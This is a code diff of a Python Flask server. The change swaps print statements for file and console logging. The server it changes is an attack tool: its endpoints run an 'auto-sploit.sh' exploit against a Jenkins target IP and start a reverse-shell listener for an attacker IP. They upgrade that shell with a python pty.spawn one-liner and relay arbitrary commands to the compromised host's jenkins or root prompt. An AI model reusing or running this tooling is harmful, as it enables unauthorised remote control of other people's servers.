@@ -21,13 +21,29 @@ This software is provided without support, warranty, or guarantee.
 Use at your own risk.
 """
 
-import pexpect
-from flask import Flask
-from flask import request
+import logging
 import os
 import time
 
+import pexpect
+from flask import Flask
+from flask import request
+
 app = Flask(__name__)
+
+logger = logging.getLogger()
+logger.setLevel(logging.DEBUG)
+
+# create file handler which logs even debug messages
+fh = logging.FileHandler('exp-server.log')
+fh.setLevel(logging.DEBUG)
+
+# create console handler with a higher log level
+ch = logging.StreamHandler()
+ch.setLevel(logging.INFO)
+
+logger.addHandler(fh)
+logger.addHandler(ch)
 
 
 @app.route("/")
@@ -51,30 +67,30 @@ def launch_sploit():
 
     """
     if request.is_json:
-        print(request.data)
+        logger.debug(request.data)
         payload = request.get_json()
-        print(request.mimetype)
-        print(request.content_type)
-        print(request.accept_mimetypes)
-        print(payload)
-        print(type(payload))
+        logger.debug(request.mimetype)
+        logger.debug(request.content_type)
+        logger.debug(request.accept_mimetypes)
+        logger.debug(payload)
+        logger.debug(type(payload))
         target_ip = payload.get('target', '')
         attacker_ip = payload.get('attacker', '')
         if target_ip == "" or attacker_ip == "":
-            print('Payload is all wrong!')
-            print(request.payload)
+            logger.error('Payload is all wrong!')
+            logger.error(payload)
             return 'ERROR'
 
         exe = '/root/auto-sploit.sh'
         if not os.path.exists(exe):
             return 500, 'launch script does not exist'
 
-        print('Launching auto-sploit.sh')
+        logger.info('Launching auto-sploit.sh')
         child = pexpect.spawn('/root/auto-sploit.sh')
         child.delaybeforesend = 2
         found_index = child.expect(['press any key to continue', pexpect.EOF, pexpect.TIMEOUT])
         if found_index == 0:
-            print('launching listener process')
+            logger.info('launching listener process')
             _launch_listener()
             child.send('\n')
         else:
@@ -82,24 +98,24 @@ def launch_sploit():
 
         found_index = child.expect(['Enter Attacker IP Address', pexpect.EOF, pexpect.TIMEOUT])
         if found_index == 0:
-            print('Sending attacker ip :::' + attacker_ip + ':::')
+            logger.info('Sending attacker ip :::' + attacker_ip + ':::')
             child.sendline(attacker_ip)
         else:
             return 'ERROR - Could not enter attacker IP'
 
         found_index = child.expect(['Enter Jenkins Target IP Address', pexpect.EOF, pexpect.TIMEOUT])
         if found_index == 0:
-            print(child.before)
-            print('Sending target ip')
+            logger.debug(child.before)
+            logger.info('Sending target ip')
             child.sendline(target_ip)
         else:
-            print(child.before)
+            logger.error(child.before)
             return 'ERROR - Could not enter jenkins IP'
 
         found_index = child.expect(['pwn', pexpect.EOF, pexpect.TIMEOUT])
         if found_index == 0:
-            print('PWN')
-            print(child)
+            logger.info('PWN')
+            logger.debug(child)
             time.sleep(2)
             return 'SUCCESS - auto-sploit launched!'
 
@@ -116,38 +132,38 @@ def send_cmd():
             return 'No Bueno - Invalid JSON payload'
 
         if 'listener' in app.config:
-            print('We have a listener already up!')
+            logger.info('We have a listener already up!')
             listener = app.config.get('listener', '')
             if not hasattr(listener, 'isalive') or not listener.isalive():
                 return 'No Bueno - Listener does not appear to be active'
 
-            print('Sending initial command to see where we are!')
+            logger.info('Sending initial command to see where we are!')
             listener.sendline('echo $SHLVL\n')
             found_index = listener.expect(['1', 'jenkins@', 'root@', pexpect.EOF, pexpect.TIMEOUT])
-            print(found_index)
+            logger.debug(found_index)
             if found_index == 0:
                 # no prompt yet
-                print('Great, trying to get a prompt now')
+                logger.info('Great, trying to get a prompt now')
                 listener.sendline("python -c 'import pty; pty.spawn(\"/bin/bash\")'")
 
             if found_index > 2:
-                print(listener.before)
+                logger.error(listener.before)
                 return 'Someting is wrong with the listener connection!'
 
             # listener.sendline(cli)
-            # print(listener)
+            # logger.debug(listener)
             found_index = listener.expect(['jenkins@.*$', 'root@.*#', pexpect.EOF, pexpect.TIMEOUT])
-            print('Found index is now: ' + str(found_index))
+            logger.debug('Found index is now: ' + str(found_index))
             if found_index > 1:
-                print(listener)
+                logger.error(listener)
                 return 'Someting is wrong with the listener connection!'
             listener.sendline(cli)
             found_index = listener.expect(['jenkins@.*$', 'root@.*#', pexpect.EOF, pexpect.TIMEOUT])
-            print('Found index after cli is now: ' + str(found_index))
+            logger.debug('Found index after cli is now: ' + str(found_index))
             if found_index > 1:
-                print(listener)
+                logger.error(listener)
                 return 'Someting is wrong with the listener connection!'
-            print(listener)
+            logger.debug(listener)
             return listener.before
 
         else:
@@ -163,7 +179,7 @@ def _launch_listener():
         if found_index != 0:
             return False
         app.config['listener'] = listener
-        print('Launched and ready to rock')
+        logger.info('Launched and ready to rock')
         return True
     else:
         listener = app.config['listener']
@@ -176,5 +192,3 @@ def _launch_listener():
                 return False
             app.config['listener'] = listener
             return True
-
-
